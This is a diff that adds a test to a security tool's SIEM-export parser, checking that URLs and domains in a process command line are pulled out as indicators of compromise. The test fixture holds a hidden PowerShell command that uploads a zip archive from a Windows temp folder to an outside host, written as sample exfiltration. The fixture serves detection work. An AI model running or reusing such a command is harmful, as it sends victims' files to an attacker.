@@ -105,6 +105,23 @@ describe("parseSiemExport — Windows Event Log mapping", () => {
     expect(vals).toContain("process:taskeng.exe");
   });
 
+  it("scrapes URL / domain indicators embedded in a process command line (exfil / C2)", () => {
+    const EXFIL = {
+      "@timestamp": "2024-03-12T17:00:21.000Z",
+      log_name: "Microsoft-Windows-Sysmon/Operational", computer_name: "FS-01.meridiancpa.com",
+      event_id: 1, level: "Information",
+      event_data: {
+        UtcTime: "2024-03-12 17:00:21.000", Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        CommandLine: "powershell.exe -nop -w hidden -c Invoke-RestMethod -Uri https://mft.brightparcel.io/u/inbox -Method Put -InFile C:\\Windows\\Temp\\rb-0312.zip",
+        User: "MERIDIANCPA\\kevin.obrien",
+      },
+    };
+    const r = parseSiemExport(elastic(EXFIL));
+    const vals = r.iocs.map((i) => `${i.type}:${i.value}`);
+    expect(vals).toContain("url:https://mft.brightparcel.io/u/inbox"); // exfil URL now promoted to an IOC
+    expect(vals).toContain("domain:mft.brightparcel.io");             // …and its domain
+  });
+
   it("carries the host as the affected asset and renders DOMAIN\\user for the asset graph", () => {
     const r = parseSiemExport(elastic(LOGON_4624));
     expect(r.events[0].asset).toBe("WINDMILLDC.windmill.local");
